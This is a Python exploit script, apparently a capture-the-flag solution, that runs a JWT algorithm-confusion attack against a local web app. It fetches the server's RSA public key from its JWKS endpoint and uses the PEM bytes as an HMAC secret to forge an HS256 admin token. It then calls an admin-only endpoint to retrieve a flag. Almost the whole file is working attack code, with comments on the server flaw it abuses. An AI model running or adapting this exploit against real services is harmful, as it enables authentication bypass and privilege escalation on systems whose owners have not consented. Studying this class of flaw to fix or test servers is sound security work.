#!/usr/bin/env python3
# /// script
# dependencies = [
#   "pyjwt>=2.8.0",
#   "requests>=2.31.0",
#   "cryptography>=41.0.0",
# ]
# ///

"""
JWT Algorithm Confusion Attack Script
Demonstrates exploitation of JWT algorithm confusion vulnerability
"""

import jwt
import json
import requests
from datetime import datetime, timedelta

# Configuration
BASE_URL = "http://localhost:3000"

def print_step(step_num, description):
    """Pretty print step headers"""
    print(f"\n{'='*60}")
    print(f"STEP {step_num}: {description}")
    print('='*60)

def main():
    print("JWT Algorithm Confusion Attack")
    print("Target:", BASE_URL)

    # Step 1: Login as regular user
    print_step(1, "Login as regular user")
    login_response = requests.post(
        f"{BASE_URL}/api/auth/login",
        json={
            "email": "user@example.com",
            "password": "password123"
        }
    )

    if login_response.status_code != 200:
        print(f"❌ Login failed: {login_response.text}")
        return

    user_token = login_response.json()["token"]
    print(f"✅ Got user token")
    print(f"Token (truncated): {user_token[:50]}...")

    # Decode to see current claims
    user_claims = jwt.decode(user_token, options={"verify_signature": False})
    print(f"Current role: {user_claims.get('role')}")
    print(f"Current email: {user_claims.get('email')}")

    # Step 2: Fetch public key from JWKS endpoint
    print_step(2, "Fetch public key from JWKS endpoint")
    jwks_response = requests.get(f"{BASE_URL}/api/auth/jwks")

    if jwks_response.status_code != 200:
        print(f"❌ Failed to fetch JWKS: {jwks_response.text}")
        return

    jwk = jwks_response.json()["keys"][0]
    print(f"✅ Retrieved public key from JWKS")
    print(f"Key type: {jwk.get('kty')}")
    print(f"Algorithm: {jwk.get('alg')}")

    # Step 3: Convert JWK to PEM format
    print_step(3, "Convert JWK to PEM format")
    from cryptography.hazmat.primitives import serialization
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.hazmat.backends import default_backend
    import base64

    # Decode the modulus and exponent from JWK
    def base64url_decode(input_str):
        """Decode base64url encoded string"""
        padding = 4 - (len(input_str) % 4)
        if padding != 4:
            input_str += '=' * padding
        return base64.urlsafe_b64decode(input_str)

    n = int.from_bytes(base64url_decode(jwk['n']), byteorder='big')
    e = int.from_bytes(base64url_decode(jwk['e']), byteorder='big')

    # Construct RSA public key
    public_numbers = rsa.RSAPublicNumbers(e, n)
    public_key = public_numbers.public_key(default_backend())

    # Convert to PEM format
    public_key_pem = public_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    )

    print("✅ Converted JWK to PEM format")
    print(f"Public key (first 100 chars):\n{public_key_pem.decode()[:100]}...")

    # Step 4: Forge JWT with HS256 using public key as secret
    print_step(4, "Forge admin JWT using HS256 algorithm")

    # Create forged payload with admin privileges
    forged_payload = {
        "sub": "999",  # Fake user ID
        "email": "admin@example.com",
        "role": "admin",  # 🚨 Privilege escalation!
        "iat": int(datetime.now().timestamp()),
        "exp": int((datetime.now() + timedelta(hours=1)).timestamp())
    }

    print(f"Forged claims: {json.dumps(forged_payload, indent=2)}")

    # 🔥 The vulnerability: Using HS256 with public key PEM as HMAC secret
    # PyJWT has safety checks, so we use the raw PEM bytes as the secret
    # This is what a vulnerable server might accept
    public_key_bytes = public_key_pem  # Use the PEM bytes directly

    forged_token = jwt.encode(
        forged_payload,
        public_key_bytes,  # Using PUBLIC key PEM as HMAC secret!
        algorithm="HS256"  # Changed from RS256 to HS256
    )

    print(f"✅ Forged admin token created")
    print(f"Token (truncated): {forged_token[:50]}...")

    # Verify it's using HS256
    header = jwt.get_unverified_header(forged_token)
    print(f"Token algorithm: {header['alg']}")

    # Step 5: Test forged token on verify endpoint
    print_step(5, "Test forged token (optional)")
    verify_response = requests.post(
        f"{BASE_URL}/api/auth/verify",
        json={"token": forged_token}
    )

    if verify_response.status_code == 200:
        print(f"✅ Token verified successfully!")
        print(f"Response: {json.dumps(verify_response.json(), indent=2)}")
    else:
        print(f"⚠️  Verification failed: {verify_response.text}")

    # Step 6: Access admin endpoint with forged token
    print_step(6, "Access admin-only endpoint with forged token")
    flag_response = requests.get(
        f"{BASE_URL}/api/admin/flag",
        headers={"Authorization": f"Bearer {forged_token}"}
    )

    if flag_response.status_code == 200:
        result = flag_response.json()
        print("🎉 SUCCESS! Retrieved the flag:")
        print(f"\n{'*'*60}")
        print(f"FLAG: {result.get('flag')}")
        print(f"MESSAGE: {result.get('message')}")
        print(f"{'*'*60}\n")
        print(f"Your decoded claims: {json.dumps(result.get('yourClaims'), indent=2)}")
    else:
        print(f"❌ Failed to access admin endpoint")
        print(f"Status: {flag_response.status_code}")
        print(f"Response: {flag_response.text}")

    print_step("COMPLETE", "Attack finished")
    print("The vulnerability exploited:")
    print("- Server accepts both RS256 and HS256 algorithms")
    print("- Public key PEM was used as HMAC secret for HS256")
    print("- This allowed forging tokens with elevated privileges")

if __name__ == "__main__":
    main()
